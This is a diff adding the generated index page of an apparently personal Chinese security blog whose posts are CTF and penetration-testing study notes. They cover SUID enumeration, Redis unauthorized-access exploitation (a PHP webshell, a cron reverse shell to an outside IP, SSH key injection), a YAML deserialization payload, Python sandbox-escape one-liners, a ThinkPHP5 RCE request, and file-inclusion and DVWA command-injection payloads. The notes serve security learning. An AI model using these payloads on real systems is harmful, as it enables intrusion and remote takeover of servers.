@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-suid提权" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/11/03/suid%E6%8F%90%E6%9D%83/" class="article-date">
+  	<time datetime="2025-11-03T11:59:32.665Z" itemprop="datePublished">2025-11-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>以下命令可以发现系统上运行的所有SUID可执行文件</p>
+<p>(具体来说命令将尝试查找具有root权限的SUID文件)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Redis未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/10/23/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2025-10-23T11:27:01.158Z" itemprop="datePublished">2025-10-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h3><p>[toc]</p>
+<h5 id="1-未授权访问-写webshell"><a href="#1-未授权访问-写webshell" class="headerlink" title="1.未授权访问(写webshell)"></a>1.未授权访问(写webshell)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-未授权访问-反弹shell"><a href="#2-未授权访问-反弹shell" class="headerlink" title="2.未授权访问(反弹shell)"></a>2.未授权访问(反弹shell)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xss &quot;\n\n*/1****bash -i &gt;&amp; /dev/tcp/139.155.49.43/1234 0&gt; &amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-未授权访问-写公钥"><a href="#3-未授权访问-写公钥" class="headerlink" title="3.未授权访问(写公钥)"></a>3.未授权访问(写公钥)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">默认情况下 生成后在用户的家目录下的.ssh目录下</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_ras.pub;echo -e &quot;\n\n&quot; &gt; /tmp/foo.txt)</span><br><span class="line">cat /tmp/foo.txt |redis-cli -h 192.168.1.100 -p 6379 -x set crackit</span><br><span class="line">redis-cli -h 192.168.1.100 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">ssh root@139.9.198.30 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>#####4.未授权访问(主从复制RCE)</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-python" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/10/10/python/" class="article-date">
+  	<time datetime="2025-10-10T11:00:46.833Z" itemprop="datePublished">2025-10-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><h5 id="ez-python（”湾区杯”网络安全大赛初赛）"><a href="#ez-python（”湾区杯”网络安全大赛初赛）" class="headerlink" title="ez_python（”湾区杯”网络安全大赛初赛）"></a>ez_python（”湾区杯”网络安全大赛初赛）</h5><p><strong>1.伪造JWT 爆破得到对称密钥</strong></p>
+<p><strong>2.执行yaml命令</strong></p>
+<p>这个命令是YAML反序列化攻击载荷，利用了Python和YAML反序列化漏洞来执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/apply:subprocess.check_output [[&quot;ls&quot;, &quot;/&quot;]]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/apply:subprocess.check_output [[&quot;cat&quot;, &quot;/f1111ag&quot;]]</span><br></pre></td></tr></table></figure>
+
+<p><strong>!!python&#x2F;object&#x2F;apply</strong> YAML标签，只是反序列化器创建Python对象</p>
+<p><strong>subprocess.check_output</strong>  Python标准库函数，用于执行系统命令并返回输出</p>
+<p><strong>[[“ls”,”&#x2F;“]]</strong> 传递给函数的参数列表</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2022-39227" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/09/27/CVE-2022-39227/" class="article-date">
+  	<time datetime="2025-09-27T10:08:25.102Z" itemprop="datePublished">2025-09-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2022-39227漏洞"><a href="#CVE-2022-39227漏洞" class="headerlink" title="CVE-2022-39227漏洞"></a>CVE-2022-39227漏洞</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-软连接" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/09/19/%E8%BD%AF%E8%BF%9E%E6%8E%A5/" class="article-date">
+  	<time datetime="2025-09-19T12:32:34.338Z" itemprop="datePublished">2025-09-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="软连接（符号链接）"><a href="#软连接（符号链接）" class="headerlink" title="软连接（符号链接）"></a>软连接（符号链接）</h4><p><strong>软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。软连接类似与c语言中的指针，传递的是文件的地址；更形象一些类似与windows系统中的快捷方式</strong></p>
+<p>创建软连接的方法（命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln  -s  [源文件或目录]  [目标文件或目录]</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-python沙箱" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/09/15/python%E6%B2%99%E7%AE%B1/" class="article-date">
+  	<time datetime="2025-09-15T12:47:59.181Z" itemprop="datePublished">2025-09-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="python沙箱"><a href="#python沙箱" class="headerlink" title="python沙箱"></a>python沙箱</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7383258697471033394">详解Python沙箱大家好！今天我们来聊一聊Python沙箱。Python沙箱的主要作用是提供一个受限的运行环境，让你可 - 掘金</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2457063">CTF - Python 沙箱绕过与任意命令执行技巧-腾讯云开发者社区-腾讯云</a></p>
+<p><strong>命令执行库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">os.system(&quot;ls&quot;)</span><br><span class="line">os.popen(&quot;ls&quot;).read()</span><br><span class="line">commands.getstatusoutput(&quot;ls&quot;) </span><br><span class="line">commands.getoutput(&quot;ls&quot;)</span><br><span class="line">commands.getstatus(&quot;file/path&quot;)</span><br><span class="line">subprocess.call(&quot;ls&quot;, shell=True)</span><br><span class="line">subprocess.Popen(&quot;ls&quot;, shell=True)</span><br><span class="line">pty.spawn(&quot;ls&quot;)</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">platform.os.system(&quot;ls&quot;)</span><br><span class="line">pdb.os.system(&quot;ls&quot;)</span><br><span class="line"># 导入函数以执行命令</span><br><span class="line">importlib.import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">importlib.__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">imp.load_source(&quot;os&quot;,&quot;/usr/lib/python3.8/os.py&quot;).system(&quot;ls&quot;)</span><br><span class="line">imp.os.system(&quot;ls&quot;)</span><br><span class="line">imp.sys.modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">sys.modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">import os</span><br><span class="line">from os import *</span><br><span class="line"># 其他有趣的函数</span><br><span class="line">open(&quot;/etc/passwd&quot;).read()</span><br><span class="line">open(&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"># 在 Python2.7 中</span><br><span class="line">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)</span><br><span class="line">system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Eval-ing-Python-代码"><a href="#Eval-ing-Python-代码" class="headerlink" title="Eval-ing Python 代码"></a><strong>Eval-ing Python 代码</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # 使用 &quot;;&quot;</span><br><span class="line">exec(&quot;print(&#x27;RCE&#x27;)\n__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # 使用 &quot;\n&quot;</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # Eval 不允许 &quot;;&quot;</span><br><span class="line">eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;)) # 这样 eval 接受 &quot;;&quot;</span><br><span class="line">__import__(&#x27;timeit&#x27;).timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;,number=1)</span><br><span class="line"># 允许换行和制表符的单行代码</span><br><span class="line">eval(compile(&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))</span><br><span class="line">exec(compile(&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))</span><br><span class="line"># 八进制</span><br><span class="line">exec(&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;)</span><br><span class="line"># 十六进制</span><br><span class="line">exec(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;)</span><br><span class="line"># Base64</span><br><span class="line">exec(&#x27;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#x27;.decode(&quot;base64&quot;)) # 仅 Python2</span><br><span class="line">exec(__import__(&#x27;base64&#x27;).b64decode(&#x27;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-HTTP请求方法" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/09/12/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" class="article-date">
+  	<time datetime="2025-09-12T12:01:31.526Z" itemprop="datePublished">2025-09-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h5><p>######<strong>9种</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kelelipeng/p/17072156.html">HTTP提交方式-PATCH说明 - kelelipeng - 博客园</a></p>
+<p>序号 方法 描述</p>
+<p><strong>1 GET 请求指定的页面信息，并返回实体主体。</strong><br>2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头<br><strong>3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和 &#x2F; 或已有资源的修改。</strong><br>4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。<br>5 DELETE 请求服务器删除指定的页面。<br>6 CONNECT HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。<br>7 OPTIONS 允许客户端查看服务器的性能。<br><strong>8 TRACE 回显服务器收到的请求，主要用于测试或诊断。</strong><br>9 PATCH 是对 PUT 方法的补充，用来对已知资源进行局部更新 。<br>最常用的还是 GET , POST</p>
+<p>ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-渗透" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/07/19/%E6%B8%97%E9%80%8F/" class="article-date">
+  	<time datetime="2025-07-19T04:12:43.079Z" itemprop="datePublished">2025-07-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h3 id="1-域名的收集"><a href="#1-域名的收集" class="headerlink" title="1.域名的收集"></a>1.域名的收集</h3><h3 id="2-IP、端口信息收集"><a href="#2-IP、端口信息收集" class="headerlink" title="2.IP、端口信息收集"></a>2.IP、端口信息收集</h3><h3 id="3-网站信息收集"><a href="#3-网站信息收集" class="headerlink" title="3.网站信息收集"></a>3.网站信息收集</h3><h3 id="4-Thinkphp5"><a href="#4-Thinkphp5" class="headerlink" title="4.Thinkphp5"></a>4.Thinkphp5</h3><p><strong>漏洞利用：</strong></p>
+<p>​	POST &#x2F;index.php?s&#x3D;captch</p>
+<p>​    _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;id</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/06/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  	<time datetime="2025-06-04T11:08:39.773Z" itemprop="datePublished">2025-06-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>[toc]</p>
+<h2 id="一、文件包含与文件包含漏洞"><a href="#一、文件包含与文件包含漏洞" class="headerlink" title="一、文件包含与文件包含漏洞"></a>一、文件包含与文件包含漏洞</h2><p><strong>文件包含:</strong></p>
+<p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。</p>
+<p><strong>文件包含漏洞:</strong></p>
+<p>开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。</p>
+<h3 id="二、文件包含漏洞用到的函数"><a href="#二、文件包含漏洞用到的函数" class="headerlink" title="二、文件包含漏洞用到的函数"></a><strong>二、文件包含漏洞用到的函数</strong></h3><p>require:找不到被包含的文件，报错，并且停止运行脚本。</p>
+<p>include:找不到被包含的文件,只会报错，但会继续运行脚本。</p>
+<p>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
+<p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
+<h3 id="三、目录遍历与文件包含的区别"><a href="#三、目录遍历与文件包含的区别" class="headerlink" title="三、目录遍历与文件包含的区别"></a><strong>三、目录遍历与文件包含的区别</strong></h3><p>目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。</p>
+<p>文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。</p>
+<h3 id="四、文件包含特征"><a href="#四、文件包含特征" class="headerlink" title="四、文件包含特征"></a><strong>四、文件包含特征</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=a.php</span><br><span class="line">?home=b.html</span><br><span class="line">?file=content</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测方法</strong></p>
+<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>?home&#x3D;main.cgi<br>?page&#x3D;<a target="_blank" rel="noopener" href="http://www.a.com/1.php">http://www.a.com/1.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://1.1.1.1/dir/file.txt">http://1.1.1.1/../../../../dir/file.txt</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-DVWAwp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/06/03/DVWAwp/" class="article-date">
+  	<time datetime="2025-06-03T11:46:44.469Z" itemprop="datePublished">2025-06-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="DVWA-wp"><a href="#DVWA-wp" class="headerlink" title="DVWA wp"></a>DVWA wp</h1><p>[toc]</p>
+<h2 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ]; 从用户请求中获取名为ip的参数值</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;  //检查是否包含&quot;windows NT&quot;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入 8.8.8.8 &amp; dir C:（Windows）</span><br><span class="line"></span><br><span class="line">实际执行：ping 8.8.8.8 &amp; dir C:</span><br><span class="line"></span><br><span class="line">后果：列出C盘所有文件</span><br><span class="line"></span><br><span class="line">输入 127.0.0.1; cat /etc/passwd（Linux）</span><br><span class="line"></span><br><span class="line">实际执行：ping -c 4 127.0.0.1; cat /etc/passwd</span><br><span class="line"></span><br><span class="line">后果：泄露系统用户信息</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
